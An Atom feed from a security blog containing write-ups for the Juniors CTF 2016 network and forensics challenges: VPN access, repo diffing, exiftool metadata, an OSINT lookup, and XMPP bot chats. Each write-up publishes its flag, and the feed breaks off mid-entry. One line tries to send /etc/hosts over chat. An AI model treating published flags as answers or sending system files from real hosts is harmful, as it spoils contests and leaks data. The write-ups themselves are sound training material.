<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RawSec</title>
  <subtitle>Security is everywhere</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rawsec.ml/"/>
  <updated>2016-11-27T21:54:59.195Z</updated>
  <id>http://rawsec.ml/</id>
  
  <author>
    <name>Alexandre ZANNI</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Juniors CTF - 100 - Find The Gobblewonker - Network</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-network-Find-The-Gobblewonker/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-network-Find-The-Gobblewonker/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, network, admin, web</p>
<blockquote>
<p>Do you want to find yourself on an island wih monsters?<br>Here are cordinates of it 10.0.17.131<br>But it’s not as easy as it seems. You need a boat.<br>You will find the boat there: <a href="https://scoreboard.ctf.org.ru/vpn/YOU_TEAM_TOKEN.7z" target="_blank" rel="external">https://scoreboard.ctf.org.ru/vpn/YOU_TEAM_TOKEN.7z</a></p>
<p>You’ll need this boat for travelling to the other islands. Fair winds and following seas!</p>
<p><img src="http://juniors.ucoz.net/hqdefault.jpg" alt=""></p>
<p>M.Iu.Lupanov</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>Download your VPN archive.</li>
<li>Of course unzip it.</li>
<li>Connect with OpenVPN.</li>
<li>Go to <code>10.0.17.131</code>. And see:</li>
</ul>
<p><img src="http://i.imgur.com/DcI9hAc.png" alt=""></p>
<p>Flag was <code>q8mvbp8sFNPpFj2dZkEkweNEFdBIuhVYkEr2brnj2qstJ3QbAtklx0imht8pdb2PafDIXs3Sxojl3m5q</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="network" scheme="http://rawsec.ml/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 400 - Dirty Repo - Forensics</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-forensics-Dirty-Repo/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-forensics-Dirty-Repo/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T22:20:23.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: admin, forensics</p>
<blockquote>
<p>Gruncle Stan loves money very much and doesn’t shun to use unacceptable tricks to get it. Not so far he started a new project with an aim to embezzlement of public funds. He hired some developers and decided to “borrow” source code. But one liberal-minded young man didn’t like, that Stan’s project is a plagiarism. This zealous fighter for justice decided to spoil one developer’s project. Try to find out, what the malefactor added.</p>
<p>Here are all developers’ projects -&gt; WORKDIRS</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>In this challenge, we get a tar.gz file. In it, there are 20 tar.gz files containing git repo from openvpn.<br>So first, I unzip all tar.gz file, and I seek so differences between repos :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ diff -r comp_1 comp_2</div><div class="line">Binary files comp_1/openvpn/.git/index and comp_2/openvpn/.git/index are differents</div><div class="line">$ diff -r comp_1 comp_3</div><div class="line">$ diff -r comp_1 comp_4</div><div class="line">$ diff -r comp_1 comp_5</div><div class="line">132a133</div><div class="line">&gt; //FLAG -&gt; gRunCle_StAn_tHe_woRsT_coDeR</div></pre></td></tr></table></figure>
<p>Flag : gRunCle_StAn_tHe_woRsT_coDeR</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 500 - Lost everything but hope - Forensics</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-forensics-Lost-everything-but-hope/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-forensics-Lost-everything-but-hope/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T22:20:14.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p><img src="https://i.imgur.com/s9I4kim.jpg" alt="https://i.imgur.com/s9I4kim.jpg">  </p>
<ul>
<li><em>screams</em>  </li>
<li>Mabel: What’s up, Gruncle???  </li>
<li>Stan: I left a phone here and went to the store to sell something useless. When I got back I saw this  </li>
<li><em>shows a broken mobile</em>  </li>
<li>Mabel: OMG!  </li>
<li>Soos: Gonna get some insulating tape.  </li>
<li>Stan: Restore the justice!  </li>
</ul>
<p>A few hours later  </p>
<ul>
<li>Dipper: Hm, who could do this?.. Soos, I managed to restore some files, maybe you can help to find something. Will you?  </li>
<li>Soos: Of course, Dipper.   </li>
</ul>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We have a <code>something.rar</code> file, and in it, there is a <code>sdcard</code> folder.<br>If we open it, we find data from an Android phone. After searching on the each folders, admin gave a <strong>hint</strong> on Telegram : <code>Someone who likes vkontakte</code>.</p>
<p>So I opened the <code>.vkontakte</code> folder and search any clue. There was an ogg file named <code>397087112_439151831</code> with size of 1Ko so we couldn’t listen anything. I had the idea that a audio conversation must be between 2 account of vkontakt so the numbers are reprenting an id of these account…<br>Let’s see if we can get a profile page of these accounts on vk.com :smirk: !</p>
<p>Go on <a href="https://vk.com/id397087112" target="_blank" rel="external">https://vk.com/id397087112</a>, we find a profile page of a pig nammed <code>Waddles Mabelpig</code>. This pig posted on the social network the flag !  </p>
<p>Flag: <code>waddles_the_d3stroyer</code> :tada:</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 200 - Clone Attack - Forensics</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-forensics-clone-attack/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-forensics-clone-attack/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, forensics</p>
<blockquote>
<p> Gravity Falls is under clones attack. Find the real Dipper and save the town</p>
<p><a href="https://yadi.sk/d/ekEIo3nwy22JC" target="_blank" rel="external">https://yadi.sk/d/ekEIo3nwy22JC</a>, <a href="http://juniors.ucoz.net/dipper2.png" target="_blank" rel="external">http://juniors.ucoz.net/dipper2.png</a></p>
<p><img src="https://i.imgbox.com/iiiv8xc8.png" alt=""></p>
<p>Lupanov M.Iu.<br><br></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><code>dipper2.jpg</code> is useless.</li>
<li>unzip <code>dipper.7z</code></li>
<li>We have 201 images:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">Ab9t2MDhgeCdtIWM.jpg  HjBQKJSOhcieolm4.jpg  n3dQQ0ZDx3S3UsBr.jpg  T1uPfBLnZwT4gnLy.jpg  zaDSq7pwGh4a38xy.jpg</div><div class="line">ABDOzIFq6epnCnhx.jpg  hk0hHu8tI5DkDyiV.jpg  N4M2CtJ7gr7Jzo9S.jpg  t1xoHMAR0IAkwfd7.jpg  Zb1RJWvpVjXFKfxq.jpg</div><div class="line">aBHn54lpn0JuymBI.jpg  HKjCtFdy5EL15cXH.jpg  N5muaN8pZFaQizT6.jpg  t2FNLj2HOKnT1naO.jpg  ZcAZFv16zVB2Xoih.jpg</div><div class="line">AbmIxXZ4ReLk7UYM.jpg  hlB31hrzrOU5RYQg.jpg  N5ZGl2k84vyFp5Br.jpg  t3sXG01KznKJiN9v.jpg  zCYJB6XDGlt8UB58.jpg</div><div class="line">ABNclrsAR0By1bUx.jpg  HLIqYcwvszKfJ2mh.jpg  n6bfa5irSSBzz1IU.jpg  t9IRCSMIJBrvArav.jpg  zD3o8PsmbXmRWNON.jpg</div><div class="line">ac9q61SRl4vlF0td.jpg  hmrrHYgpxaW6V6XU.jpg  n6BS4SVXzrkIRpsu.jpg  TBHJwtjbcXh2GYv9.jpg  zdd9UFYGdxytCbCz.jpg</div><div class="line">[...]</div></pre></td></tr></table></figure>
<ul>
<li>Let’s take a look at the first image:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ exiftool 07snLOxf2k0rRrT3.jpg</div><div class="line">ExifTool Version Number         : 10.20</div><div class="line">File Name                       : 07snLOxf2k0rRrT3.jpg</div><div class="line">Directory                       : .</div><div class="line">File Size                       : 26 kB</div><div class="line">File Modification Date/Time     : 2016:11:03 04:56:07+01:00</div><div class="line">File Access Date/Time           : 2016:11:25 16:47:44+01:00</div><div class="line">File Inode Change Date/Time     : 2016:11:25 16:48:53+01:00</div><div class="line">File Permissions                : rw-r--r--</div><div class="line">File Type                       : JPEG</div><div class="line">File Type Extension             : jpg</div><div class="line">MIME Type                       : image/jpeg</div><div class="line">JFIF Version                    : 1.01</div><div class="line">Resolution Unit                 : inches</div><div class="line">X Resolution                    : 72</div><div class="line">Y Resolution                    : 72</div><div class="line">Current IPTC Digest             : 1f6df1813fc08f735211d55b866d1cca</div><div class="line">Coded Character Set             : UTF8</div><div class="line">Envelope Record Version         : 4</div><div class="line">Object Name                     : Ксерокопия  номер  086</div><div class="line">Application Record Version      : 4</div><div class="line">Comment                         : Flag is MD5sum of this file. Its TRUE</div><div class="line">Image Width                     : 193</div><div class="line">Image Height                    : 400</div><div class="line">Encoding Process                : Progressive DCT, Huffman coding</div><div class="line">Bits Per Sample                 : 8</div><div class="line">Color Components                : 3</div><div class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</div><div class="line">Image Size                      : 193x400</div><div class="line">Megapixels                      : 0.077</div></pre></td></tr></table></figure>
<ul>
<li><code>Comment                         : Flag is MD5sum of this file. Its TRUE</code> but all images have the same comment.</li>
<li><code>Object Name                     : Ксерокопия  номер  086</code> means <code>n° of copie 086</code>, let’s fidn teh original:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ exiftool * | grep &apos;Object Name&apos;</div><div class="line">[...]</div><div class="line">Object Name                     : Ксерокопия  номер  644</div><div class="line">Object Name                     : Оригинальный Диппер</div><div class="line">Object Name                     : Ксерокопия  номер  702</div><div class="line">[...]</div></pre></td></tr></table></figure>
<ul>
<li>We found it, <code>Оригинальный Диппер</code> means <code>The original Dipper</code>:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ grep -r &apos;Оригинальный Диппер&apos; ./</div><div class="line">Binary file ./atvF2wf1tfB2IkuV.jpg matches</div><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ md5sum atvF2wf1tfB2IkuV.jpg</div><div class="line">cd4d19b8471cecbc8ea7544de59db368  atvF2wf1tfB2IkuV.jpg</div></pre></td></tr></table></figure>
<ul>
<li><code>cd4d19b8471cecbc8ea7544de59db368</code> was the flag.</li>
</ul>
<p><img src="https://i.imgbox.com/K5qOYSYB.jpg" alt=""></p>
<p><strong>Feedback</strong>: it’s a international CTF, so please use only english, russian content everywhere is pain for non-russian</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 500 - Skeleton in the closet - Joy</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-network-Skeleton-in-the-closet/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-network-Skeleton-in-the-closet/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: network, joy, admin</p>
<blockquote>
<p><img src="http://i.imgur.com/bXKRRBB.png" alt=""></p>
<p><img src="http://i.imgur.com/HnyYDnR.jpg" alt=""></p>
<p>#hint for task with jabber: try to use another clients because clients works differently with anonymous auth.</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ echo dipper lo-o-ssE-bo |tr ipodlEsb- ab0j1328.</div><div class="line">jabber 10.0.223.80</div></pre></td></tr></table></figure>
<p>with pidgin &amp; wireshark</p>
<ul>
<li>domain: 10.0.223.80</li>
<li>server: 10.0.223.80</li>
</ul>
<p>change domaine to:<br>mystery-hack.gravity.falls</p>
<ul>
<li>domain: mystery-hack.gravity.falls</li>
<li>server: 10.0.223.80</li>
</ul>
<p>Pidgin can’t be used because it doesn’t support anonymous connection.</p>
<p>Use <a href="http://profanity.im/" target="_blank" rel="external">Profanity</a> instead:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/connect anonymous@mystery-hack.gravity.falls server 10.0.223.80</div></pre></td></tr></table></figure>
<p>Some people are connected:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">dipper@mystery-hack.gravity.falls</div><div class="line">root</div><div class="line">ru2en@bot.talk.google.com</div><div class="line">stand</div></pre></td></tr></table></figure>
<p>Let’s talk to <code>dipper@mystery-hack.gravity.falls</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/msg dipper@mystery-hack.gravity.falls hello</div></pre></td></tr></table></figure>
<p>He told us:</p>
<ul>
<li>Russian: <code>Я очень смышленый парень. Но сейчас не понимаю ни слова.</code></li>
<li>English: <code>I am very clever guy. But now I do not understand a word.</code></li>
</ul>
<p>We talked to <code>stand</code>:</p>
<ul>
<li>Russian: <code>Это ты что сейчас сказал? Всегда четко формулируй, что тебе надо. Ты что, русского языка не понимаешь. Тогда тебе сюда: ru2en@bot.talk.google.com</code></li>
<li>English: <code>That&#39;s what you have just said that? Always articulate what you need. What, you do not understand the Russian language. Then you here: ru2en@bot.talk.google.com</code></li>
</ul>
<p>Admins said us that <code>ru2en@bot.talk.google.com</code> doesn’t work and we need to use Google Translate and speak to <code>dipper@mystery-hack.gravity.falls</code> in russian only.</p>
<p>We tried to invite him in a room but he didn’t want to come in:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/join</div><div class="line">/room accept</div><div class="line">/invite dipper@mystery-hack.gravity.falls</div></pre></td></tr></table></figure>
<p>We tried to get some infos about him:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/info dipper@mystery-hack.gravity.falls</div><div class="line">11:51:30 - dipper@mystery-hack.gravity.falls:</div><div class="line">11:51:30 - Subscription: none</div></pre></td></tr></table></figure>
<p>We checked upload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/sendfile /etc/hosts</div><div class="line">11:55:25 - XEP-0363 HTTP File Upload is not supported by the server</div></pre></td></tr></table></figure>
<p>We added him in contact, check if he had a pgp public key, wanted to subscribe to his presence and allow him to see ours, but it seems he doesn’t want to be our friend:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/roster add dipper@mystery-hack.gravity.falls</div><div class="line">/pgp contacts</div><div class="line">/sub request dipper@mystery-hack.gravity.falls</div><div class="line">/sub allow dipper@mystery-hack.gravity.falls</div><div class="line">/sub show dipper@mystery-hack.gravity.falls</div><div class="line">12:20:08 - Awaiting subscription responses from:</div><div class="line">12:20:08 -   dipper@mystery-hack.gravity.falls</div></pre></td></tr></table></figure>
<p>Last activity requests are forbidden:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/lastactivity dipper@mystery-hack.gravity.falls</div><div class="line">12:24:27 - Last activity request failed for dipper@mystery-hack.gravity.falls: forbidden</div></pre></td></tr></table></figure>
<p>Someone in the Telegram chat talked about <code>mabel</code>, so we tried:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/msg mabel@mystery-hack.gravity.falls hello</div></pre></td></tr></table></figure>
<p>He said us:</p>
<ul>
<li>russian: <code>Не понимаю, чего вы хотите? Я богиня разрушения!</code></li>
<li>english: <code>I do not know what you want? I am the goddess of destruction!</code></li>
</ul>
<p>Try to list rooms again, this times it works:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/rooms</div><div class="line">13:08:11 - Chat rooms at conference.mystery-hack.gravity.falls:</div><div class="line">13:08:11 -   hall@conference.mystery-hack.gravity.falls, (hall (12))</div><div class="line">13:08:11 -   dipper@conference.mystery-hack.gravity.falls, (dipper (1))</div><div class="line">13:08:11 -   flag_shop@conference.mystery-hack.gravity.falls, (flag_shop (4))</div></pre></td></tr></table></figure>
<p>We joined hall (<code>/join hall</code>), there is some users:</p>
<ul>
<li>Moderators: stan</li>
<li>Participants: dipper, Gideon, mabel, soos, wendy</li>
<li>Visitors: ctf players I suppose</li>
</ul>
<p>We talked to soos:</p>
<ul>
<li>russian: <code>Чувак, я тебя не понимаю. Хотя мудрость - мое благословение и проклятие.</code></li>
<li>english: <code>Dude, I do not understand you. Although wisdom - my blessing and a curse.</code></li>
</ul>
<p>When we talk, giving only keywords, nobody understand us so let’s try some complete sentences:</p>
<p>To stan:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Me:</div><div class="line">Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)</div><div class="line"></div><div class="line">stan:</div><div class="line">Хотите флаг? (You want to flag?)</div><div class="line">Могу предложить флаг Конфедерации за сотку баксов. (I can offer the Confederate flag for a hundred bucks.)</div><div class="line">Пока рядом нет полиции - все законно! (While not near the police - all legally!)</div><div class="line">ХА-ХА-ХА!!! (Ha-ha-ha !!!)</div><div class="line">Если есть какие-то вопросы - обратитесь к soos (If you have any questions - please contact soos)</div></pre></td></tr></table></figure>
<p>To soos:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Me:</div><div class="line">Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)</div><div class="line"></div><div class="line">soos:</div><div class="line">Можно вопрос, зачем тебе флаг? (It is possible to question, why do you a flag?)</div><div class="line">Лучше обратись к dipper, он специалист по загадкам. (Better to turn to the dipper, he riddles specialist.)</div><div class="line">Вообще-то я второстепенный персонаж. (Actually, I&apos;m a minor character.)</div><div class="line">О боже, второстепенные персонажы погибают в первые пять минут. (Oh God, the secondary characters are killed in the first five minutes.)</div><div class="line">Что же делать? (What to do?)</div></pre></td></tr></table></figure>
<p>Ok so let’s talk to dipper:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Me:</div><div class="line">Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)</div><div class="line"></div><div class="line">dipper:</div><div class="line">Флаг? Причем тут флаг? (Flag? And the flag here?)</div><div class="line">Это очередная загадка Гравити Фолз?. (This is another mystery Gravity Falls ?.)</div><div class="line">Я ее обязательно разгадаю. (I&apos;m sure it unravel.)</div><div class="line">Но сейчас мне некогда, у меня свидание с wendy. (But now I have no time, I have a date with wendy.)</div></pre></td></tr></table></figure>
<p>Let’s try wendy:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Me:</div><div class="line">Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)</div><div class="line"></div><div class="line">wendy:</div><div class="line">Флаг? Ну да. Почему бы и нет. (Flag? Well yes. Why not.)</div><div class="line">Хотя лучше утка. Или панда. (Although better duck. Or panda.)</div><div class="line">Но по животным у нас специалист mabel (But animals have specialist mabel)</div></pre></td></tr></table></figure>
<p>mabel:</p>
